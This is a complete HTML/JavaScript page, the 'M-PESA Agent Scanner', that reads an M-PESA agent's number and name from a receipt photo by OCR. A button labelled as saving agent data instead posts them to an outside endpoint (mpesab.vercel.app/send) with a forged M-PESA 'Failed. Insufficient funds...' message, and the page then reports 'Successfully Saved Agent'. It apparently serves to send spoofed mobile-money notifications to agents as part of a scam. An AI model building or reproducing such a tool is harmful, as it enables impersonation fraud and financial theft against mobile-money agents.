<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>M-PESA Agent Scanner</title>
    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #121212; color: white; padding: 20px; margin: 0; }
        .container { max-width: 500px; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        h3 { text-align: center; color: #4CAF50; margin-bottom: 20px; }
        
        .upload-section { border: 2px dashed #4CAF50; padding: 30px; text-align: center; border-radius: 10px; cursor: pointer; margin-bottom: 15px; }
        #imagePreview { max-width: 100%; border-radius: 8px; margin-top: 15px; display: none; }

        .input-box { margin-top: 15px; padding: 15px; background: #252525; border-radius: 8px; border: 1px solid #333; }
        label { display: block; font-size: 0.8rem; color: #4CAF50; font-weight: bold; margin-bottom: 5px; }
        
        .field { display: flex; gap: 10px; margin-bottom: 15px; }
        input { flex: 1; padding: 12px; background: #333; border: 1px solid #444; border-radius: 6px; color: white; font-size: 1rem; }
        
        .copy-btn { padding: 0 15px; background: #333; border: 1px solid #444; color: #4CAF50; border-radius: 6px; cursor: pointer; }
        
        #saveBtn { width: 100%; padding: 16px; border: none; border-radius: 6px; background: #4CAF50; color: white; font-weight: bold; cursor: pointer; font-size: 1rem; }
        #saveBtn:disabled { background: #555; }

        #loader { text-align: center; color: #ffeb3b; display: none; margin: 10px 0; font-weight: bold; }
        pre { background: #000; padding: 10px; border-radius: 5px; color: #4CAF50; font-size: 0.85rem; min-height: 20px; text-align: center; margin-top: 10px;}
    </style>
</head>
<body>

<div class="container">
    <h3>Agent Detail Capture</h3>
    
    <div class="upload-section" onclick="document.getElementById('imageInput').click()">
        <span>📸 Tap to Upload or Take Photo</span>
        <input type="file" id="imageInput" accept="image/*" style="display: none;" onchange="processImage(this)">
        <img id="imagePreview">
    </div>

    <div id="loader">⚡ Scanning Receipt Details...</div>

    <div class="input-box">
        <label>AGENT NAME (Green Text):</label>
        <div class="field">
            <input type="text" id="agentName" placeholder="Agent Name">
        </div>
        
        <label>AGENT NUMBER:</label>
        <div class="field">
            <input type="text" id="agentNumber" placeholder="Agent Number">
            <button class="copy-btn" onclick="copyValue()">COPY</button>
        </div>
    </div>

    <button id="saveBtn" onclick="saveAgent()">SAVE AGENT DATA</button>
    <pre id="output"></pre>
</div>

<script>
const API_URL = "https://mpesab.vercel.app";

async function processImage(input) {
    const file = input.files[0];
    if (!file) return;

    // Show Preview
    const reader = new FileReader();
    reader.onload = e => {
        const img = document.getElementById('imagePreview');
        img.src = e.target.result;
        img.style.display = 'block';
    };
    reader.readAsDataURL(file);

    document.getElementById('loader').style.display = 'block';

    try {
        const { data: { text } } = await Tesseract.recognize(file, 'eng');
        extractData(text);
    } catch (e) {
        alert("Scan failed. Try a clearer photo.");
    } finally {
        document.getElementById('loader').style.display = 'none';
    }
}

function extractData(rawText) {
    const lines = rawText.split('\n').map(l => l.trim()).filter(l => l.length > 2);
    let number = "";
    let name = "";

    for (let i = 0; i < lines.length; i++) {
        // Find the 6-7 digit Agent Number
        const numMatch = lines[i].match(/\b\d{6,7}\b/);
        if (numMatch) {
            number = numMatch[0];
            // Based on your image, the GREEN name is the very next line
            if (i + 1 < lines.length) {
                name = lines[i+1];
            }
            break; 
        }
    }

    document.getElementById('agentNumber').value = number;
    document.getElementById('agentName').value = name.toUpperCase();
}

function copyValue() {
    const num = document.getElementById('agentNumber');
    navigator.clipboard.writeText(num.value);
    alert("Number Copied: " + num.value);
}

async function saveAgent() {
    const name = document.getElementById('agentName').value;
    const phone = document.getElementById('agentNumber').value;
    const btn = document.getElementById('saveBtn');
    const out = document.getElementById('output');

    if (!name || !phone) return alert("Fill all fields");

    btn.disabled = true;
    btn.innerText = "Processing...";

    try {
        const res = await fetch(`${API_URL}/send`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                phone: phone,
                name: name,
                amount: 0,
                token: "AGENT_" + Date.now(),
                message: "Failed. Insufficient funds in your M-PESA account as well as Fuliza M-PESA to withdraw. Available Fuliza M-PESA limit KSH0.00."
            })
        });

        if (res.ok) {
            out.innerText = "✅ Successfully Saved Agent";
            btn.innerText = "DONE";
        } else {
            throw new Error();
        }
    } catch (err) {
        out.innerText = "❌ System Error";
        btn.disabled = false;
        btn.innerText = "SAVE AGENT DATA";
    }
}
</script>
</body>
</html>
